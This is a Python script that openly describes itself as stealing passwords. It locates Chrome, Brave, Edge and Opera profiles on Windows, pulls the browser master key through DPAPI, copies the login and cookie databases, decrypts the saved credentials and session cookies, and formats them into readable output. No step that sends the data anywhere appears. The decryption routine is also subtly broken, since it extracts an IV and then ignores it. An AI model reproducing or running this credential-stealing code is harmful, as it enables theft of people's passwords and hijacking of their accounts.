import os
import re
import json
import sqlite3
import shutil
from base64 import b64decode
from Crypto.Cipher import AES
import win32crypt

def get_browser_paths():
    """Get paths for all supported browsers"""
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    
    return {
        'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data'),
        'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
        'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        'OperaGX': os.path.join(roaming, 'Opera Software', 'Opera GX Stable')
    }

def get_master_key(browser_path):
    """Extract the master encryption key from browser's Local State"""
    local_state_path = os.path.join(browser_path, 'Local State')
    if not os.path.exists(local_state_path):
        return None
    
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    
    encrypted_key = b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(cipher, encrypted_data):
    """Decrypt password using AES-GCM cipher"""
    iv = encrypted_data[3:15]
    payload = encrypted_data[15:-16]
    return cipher.decrypt(payload).decode()

def process_browser(browser_name, browser_path, master_key):
    """Process a single browser to extract passwords and cookies"""
    results = {'passwords': [], 'cookies': []}
    cipher = AES.new(master_key, AES.MODE_GCM, b' ' * 12)  # Dummy IV, will be replaced
    
    # Process passwords
    login_data_path = os.path.join(browser_path, 'Login Data')
    if os.path.exists(login_data_path):
        temp_db = 'temp_login.db'
        try:
            shutil.copy2(login_data_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for url, username, encrypted_password in cursor.fetchall():
                if not url or not username or not encrypted_password:
                    continue
                
                try:
                    decrypted = decrypt_password(cipher, encrypted_password)
                    results['passwords'].append({
                        'browser': browser_name,
                        'url': url,
                        'username': username,
                        'password': decrypted
                    })
                except:
                    continue
            
            conn.close()
        except Exception as e:
            pass
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)
    
    # Process cookies
    cookies_path = os.path.join(browser_path, 'Network', 'Cookies')
    if os.path.exists(cookies_path):
        temp_db = 'temp_cookies.db'
        try:
            shutil.copy2(cookies_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
            
            for host, name, encrypted_cookie in cursor.fetchall():
                if not host or not name or not encrypted_cookie:
                    continue
                
                try:
                    decrypted = decrypt_password(cipher, encrypted_cookie)
                    results['cookies'].append({
                        'browser': browser_name,
                        'host': host,
                        'name': name,
                        'value': decrypted
                    })
                except:
                    continue
            
            conn.close()
        except Exception as e:
            pass
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)
    
    return results

def steal_passwords():
    """Main function to steal all passwords from browsers"""
    all_results = {'passwords': [], 'cookies': []}
    browser_paths = get_browser_paths()
    
    for browser_name, base_path in browser_paths.items():
        if not os.path.exists(base_path):
            continue
        
        # Handle Chrome profiles
        if browser_name == 'Chrome':
            for item in os.listdir(base_path):
                if item.startswith('Profile ') or item == 'Default':
                    profile_path = os.path.join(base_path, item)
                    master_key = get_master_key(base_path)
                    if master_key:
                        results = process_browser(
                            f'Chrome ({item})', 
                            profile_path, 
                            master_key
                        )
                        all_results['passwords'].extend(results['passwords'])
                        all_results['cookies'].extend(results['cookies'])
        
        # Handle other browsers
        else:
            master_key = get_master_key(base_path)
            if master_key:
                results = process_browser(browser_name, base_path, master_key)
                all_results['passwords'].extend(results['passwords'])
                all_results['cookies'].extend(results['cookies'])
    
    return all_results

def format_results(data, data_type):
    """Format the stolen data into a readable string"""
    if data_type == 'passwords':
        output = []
        for item in data:
            output.append(f"Browser: {item['browser']}")
            output.append(f"URL: {item['url']}")
            output.append(f"Username: {item['username']}")
            output.append(f"Password: {item['password']}")
            output.append("")
        return "\n".join(output)
    
    elif data_type == 'cookies':
        output = []
        for item in data:
            output.append(f"Browser: {item['browser']}")
            output.append(f"Host: {item['host']}")
            output.append(f"Name: {item['name']}")
            output.append(f"Value: {item['value']}")
            output.append("")
        return "\n".join(output)
    
    return "No data found"